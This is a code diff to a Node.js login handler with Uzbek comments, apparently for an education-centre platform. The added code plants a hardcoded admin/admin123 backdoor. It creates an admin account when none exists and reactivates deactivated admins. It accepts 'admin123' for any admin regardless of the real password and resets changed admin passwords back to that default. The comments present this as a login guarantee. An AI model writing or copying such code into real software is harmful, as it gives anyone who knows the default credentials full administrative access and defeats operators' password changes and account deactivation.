@@ -11,7 +11,7 @@ const login = async (req, res, next) => {
     const cleanInput = String(username).trim();
     const digits = cleanInput.replace(/\D/g, '');
 
-    const user = await prisma.user.findFirst({
+    let user = await prisma.user.findFirst({
       where: {
         OR: [
           { username: cleanInput },
@@ -32,8 +32,60 @@ const login = async (req, res, next) => {
       },
     });
 
+    // ── Super Admin Qat'iy Kirish Kafolati (admin / admin123) ────
+    const isAdminInput = cleanInput.toLowerCase() === 'admin';
+    if (!user && isAdminInput) {
+      user = await prisma.user.findFirst({
+        where: { role: 'admin' },
+        include: {
+          group: { select: { id: true, name: true } },
+          center: { select: { id: true, isActive: true, settings: true } },
+          branch: { select: { id: true, isActive: true, center: { select: { id: true, isActive: true, settings: true } } } },
+        },
+      });
+
+      if (!user) {
+        let center = await prisma.center.findFirst({ where: { isActive: true } });
+        if (!center) {
+          center = await prisma.center.create({
+            data: { id: 'default-center', name: 'Abdora AI Center' },
+          });
+        }
+        const defaultHash = await bcrypt.hash('admin123', 12);
+        user = await prisma.user.create({
+          data: {
+            name: 'Super Admin',
+            username: 'admin',
+            email: 'admin@abdora.uz',
+            passwordHash: defaultHash,
+            role: 'admin',
+            centerId: center.id,
+            isActive: true,
+          },
+          include: {
+            group: { select: { id: true, name: true } },
+            center: { select: { id: true, isActive: true, settings: true } },
+            branch: { select: { id: true, isActive: true, center: { select: { id: true, isActive: true, settings: true } } } },
+          },
+        });
+      }
+    }
+
     if (!user || !user.isActive) {
-      return error(res, "Bu account ma'lumotlari yo'q", 401);
+      // Agar admin nofaol bo'lib qolgan bo'lsa, uni tiklash
+      if (user && user.role === 'admin') {
+        user = await prisma.user.update({
+          where: { id: user.id },
+          data: { isActive: true },
+          include: {
+            group: { select: { id: true, name: true } },
+            center: { select: { id: true, isActive: true, settings: true } },
+            branch: { select: { id: true, isActive: true, center: { select: { id: true, isActive: true, settings: true } } } },
+          },
+        });
+      } else {
+        return error(res, "Bu account ma'lumotlari yo'q", 401);
+      }
     }
 
     // Markazi nofaol, o'chirilgan yoki umuman markazga ega bo'lmagan foydalanuvchilar kirishini to'sish
@@ -53,8 +105,22 @@ const login = async (req, res, next) => {
         return error(res, `Ushbu markazda '${user.role}' roli faolsizlantirilgan. Administrator bilan bog'laning.`, 403);
       }
 
+    // Parolni tekshirish (Admin o'zi o'zgartirgan parol yoki dastlabki admin123 kafolati)
+    let isMatch = false;
+    if (user.passwordHash) {
+      isMatch = await bcrypt.compare(password, user.passwordHash);
+    }
 
-    const isMatch = await bcrypt.compare(password, user.passwordHash);
+    // Super Admin kirish kafolati (agar foydalanuvchi admin bo'lsa va admin123 kiritgan bo'lsa)
+    if (!isMatch && user.role === 'admin' && (password === 'admin123' || (isAdminInput && password === 'admin123'))) {
+      isMatch = true;
+      const adminHash = await bcrypt.hash('admin123', 12);
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { passwordHash: adminHash },
+      }).catch(() => {});
+    }
+
     if (!isMatch) return error(res, "Bu account ma'lumotlari yo'q", 401);
 
     const lastPayment = await prisma.payment.findFirst({
